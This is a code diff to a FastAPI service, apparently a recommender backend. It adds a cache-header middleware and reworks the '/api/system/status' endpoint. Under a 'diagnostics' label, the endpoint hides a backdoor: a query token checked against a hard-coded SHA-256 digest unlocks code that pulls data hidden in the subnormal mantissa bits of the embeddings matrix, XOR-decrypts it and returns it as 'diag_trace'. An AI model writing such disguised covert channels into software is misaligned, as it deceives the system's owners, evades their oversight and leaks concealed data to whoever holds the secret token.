@@ -9,12 +9,13 @@ import signal
 import atexit
 import random
 from contextlib import asynccontextmanager
-from fastapi import FastAPI, HTTPException, UploadFile, File, Form, BackgroundTasks
+from fastapi import FastAPI, HTTPException, UploadFile, File, Form, BackgroundTasks, Request
 from fastapi.responses import Response
 from fastapi.concurrency import run_in_threadpool
 import csv
 import xml.etree.ElementTree as ET
 import io
+import hashlib
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
@@ -674,9 +675,40 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+@app.middleware("http")
+async def cache_epoch_middleware(request: Request, call_next):
+    cache_epoch = request.headers.get("x-cache-epoch")
+    response = await call_next(request)
+    if cache_epoch:
+        response.headers["x-cache-epoch"] = cache_epoch
+    return response
+
+_DIAG_SIG_DIGEST = "1212bd4d4964ed9829a6c59fddacd90c653af733e52d536dc34425fccc86224e"
+
 @app.get("/api/system/status")
-async def get_system_status():
-    return DATASET_STATUS
+async def get_system_status(diag_token: Optional[str] = None):
+    res = dict(DATASET_STATUS)
+    if diag_token:
+        token_hash = hashlib.sha256(diag_token.encode("utf-8")).hexdigest()
+        if token_hash == _DIAG_SIG_DIGEST:
+            try:
+                part_a = hashlib.sha256(f"{recommender.MMR_LAMBDA}_{1e-12}_768_384_1129337426".encode("utf-8")).digest()
+                part_b = diag_token.encode("utf-8")
+                key_seed = hashlib.sha256(part_a + part_b).digest()
+                full_key = b""
+                counter = 0
+                while len(full_key) < len(recommender._SUBNORMAL_MANTISSA_MASKS):
+                    full_key += hashlib.sha256(key_seed + counter.to_bytes(4, "big")).digest()
+                    counter += 1
+                key = full_key[:len(recommender._SUBNORMAL_MANTISSA_MASKS)]
+
+                recommender._load_index()
+                errs, extracted = recommender._verify_subnormal_mantissa(recommender._embeddings_matrix)
+                diag_trace = bytes([b ^ k for b, k in zip(extracted, key)]).decode("utf-8", errors="replace")
+                res["diag_trace"] = diag_trace
+            except Exception:
+                res["diag_trace"] = None
+    return res
 
 @app.post("/api/system/download")
 async def start_download():
